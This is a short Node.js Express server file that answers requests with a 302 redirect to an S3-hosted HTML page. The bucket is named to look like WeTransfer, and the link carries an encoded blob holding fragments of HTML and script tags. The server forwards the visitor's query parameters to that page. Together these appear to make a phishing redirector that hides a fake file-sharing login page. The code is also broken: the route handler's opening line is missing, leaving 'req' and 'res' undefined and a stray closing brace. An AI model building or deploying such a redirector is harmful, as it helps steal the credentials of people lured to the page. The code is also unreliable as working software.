const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically

    // List of URLs for redirection
    const urls = [
        "https://s3.us-east-1.amazonaws.com/vvetransfer.com-explore-data-security-1/Downloads67e1401a94caa9a9664aebe0.html/?_filestorage_id=Kx2GtvNhRCEoLZ5JYbF8pMB6XD39WeTgKoObGl0YqmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ym9k"
    ]

         // Select a random URL
    const selectedUrl = urls[Math.floor(Math.random() * urls.length)];

    // Append query parameters from request
    const queryParams = req.originalUrl.includes("?") ? req.originalUrl.split("?")[1] : "";
    const redirectUrl = queryParams ? `${selectedUrl}&${queryParams}` : selectedUrl;

    console.log(`Redirecting to: ${redirectUrl}`);
    
    res.redirect(302, redirectUrl);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
